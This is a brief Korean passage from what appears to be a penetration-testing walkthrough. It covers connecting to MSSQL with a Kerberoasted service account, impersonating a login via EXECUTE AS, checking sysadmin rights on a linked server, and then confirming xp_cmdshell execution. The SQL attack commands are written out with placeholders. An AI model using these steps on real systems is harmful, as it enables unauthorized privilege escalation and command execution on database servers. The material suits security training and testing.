...
### Kerberoasting으로 복구한 MSSQLSvc 계정으로 접속

`MSSQLSvc/<MSSQL_FQDN>:<MSSQL_PORT>`에서 FQDN과 숫자 포트를 가져오고, 수집 출력의 `SamAccountName`을 `<SPN_USER>`로 사용한다. 전체 SPN 문자열은 사용자명이 아니다. 비밀번호는 target 문자열에 넣지 않고 prompt에 입력한다.
...
```text
SQL> USE master;
SQL> EXECUTE AS LOGIN = '<IMPERSONATE_TARGET>';
SQL> SELECT SYSTEM_USER;
SQL> SELECT ORIGINAL_LOGIN();
SQL> EXECUTE('SELECT CAST(@@SERVERNAME AS varchar(40)) AS server, CAST(SYSTEM_USER AS varchar(40)) AS login, IS_SRVROLEMEMBER(''sysadmin'') AS sysadmin') AT [<LINKED_SERVER>];
SQL> REVERT;
```

linked server 쪽에서 `sysadmin = 1`이면 `EXECUTE ... AT`로 `xp_cmdshell` 실행을 확인한다.
